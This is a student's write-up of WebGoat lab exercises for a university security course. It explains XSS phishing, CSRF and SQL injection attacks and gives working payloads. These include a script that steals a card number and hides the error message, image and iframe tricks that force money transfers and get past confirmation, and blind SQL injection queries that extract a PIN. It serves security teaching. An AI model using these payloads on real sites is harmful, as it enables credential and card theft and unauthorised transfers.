#Sida Xiong, 1008498305, sida.xiong@mail.utoronto.ca

Part 1 Explanation:
I add a HTML form to the search field to create a fake login form, which is vulnerable to XSS.
And the user will be tricked to type in the username and password to the fake login form.
I bind a function to the "submit" in my form, on clicking which, the username and password will be posted in a request.  

Part 2 Explanation:
my unencoded version of URL (script as the latter part of URL):
http://localhost:8090/WebGoat/start.mvc#attack/SCREEN_ID/900?input1=123&input2=
<script>
	document.getElementsByName("buy")[0].onclick=function(){
		var creditcard = document.getElementsByName("input1")[0].value;
		window.location.href='http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum='+creditcard;
	}
	document.getElementsByName("input2")[0].value='000';
	document.getElementById("message").style.display='none';
</script>
This script is set as the input value of input2(three digit access code), and it will show in the front end as an executable script.
In the script, I add an onclick event to the existing button "buy", when the button is clicked, 
I will acquire the value of input1(credit card number), and post it in a request.
And in order to make the page of URL(encoded from this script) similar to the original page, 
I need set the value input2 as its default number 000,
and also set the "message" as undisplayable in order to blind the user from knowing we phished the page, 
otherwise, it will inform the user that "Whoops, you entered [] instead of your three digit code...".

Part 3 Explanation:
I enter an image link in HTML into the Message. So when the page load this image, it will request to the image source,
so if we forge the image source as "attack?Screen=1430709817&menu=900&transfer=5000" and make the image too small to be seen, 
the user will be tricked to make money transfered without awareness.

Part 4 Explanation:
Different to the part3, the money transfer in this part requires user's confirmation. 
However, we can make a second request to by-pass the user's confirmation.
I can insert two iframes, the first one's source is similar as what we forged in part3, and set the second with no source. 
And I can add an onload attribute of the first iframe to set the source of the second iframe, 
this second source is an URL that make confirmation request to help by-pass the user's actual confirmation.
Once the first iframe is loaded successfully, it will set the second iframe's source, and the second iframe will be loaded, 
which send the request to confirm the transfer and complete the transfer process.
Specifically, if we want to use img label instead of iframe label, we should add onerror attribute instead of onload attribute 
because the image cannot be loaded successfully with the forged source.

Part 5 Explanation:
In this part, the user should go to main page and type in the amount of money they want to transfer and click "Submit Query" 
to actually complete the transfer, and when they click, it will send a request with the transfer amount and the token.
So we also need use two iframe to send two requests. First, we need set the first iframe' source to main page 
and then also add an onload attribute which get the token from the content document from the first iframe 
and append it to the source of second iframe.

Part 6 Explanation:
I type Smith' or 1=1 -- into it, and it will be directly appended to the actual query, so with or 1=1, the statement is always true,
thus we can have all user's information printed.

Part 7 Explanation:
In the first step, I use 101; UPDATE employee SET salary=999 where userid=101-- to update the 101 user's salary.
In the second step, I create a trigger that will automatically change the email of any new user entry to "ece568_22s@utoronto.ca".

Part 8 Explanation:
We can use the different response to help us guess the pin number one by one.
We can use AND to append our guess statement in a valid account number 101, 
we can use ">","<" to guess a scope of a number, and use "=" to ensure the answer.
When we make a true statement, the response will be "Account number is valid", 
and when the statement is false, "Invalid account number" will say.
The approximate guess process is as follows.
101 AND (SUBSTRING((SELECT pin FROM credit WHERE cc_number='1234123412341234'),1,1)>'2')
101 AND (SUBSTRING((SELECT pin FROM credit WHERE cc_number='1234123412341234'),1,1)<'5')
101 AND (SUBSTRING((SELECT pin FROM credit WHERE cc_number='1234123412341234'),1,1)='3')
...
101 AND (SUBSTRING((SELECT pin FROM credit WHERE cc_number='1234123412341234'),2,1)='3')
101 AND (SUBSTRING((SELECT pin FROM credit WHERE cc_number='1234123412341234'),3,1)='1')
101 AND (SUBSTRING((SELECT pin FROM credit WHERE cc_number='1234123412341234'),4,1)='8')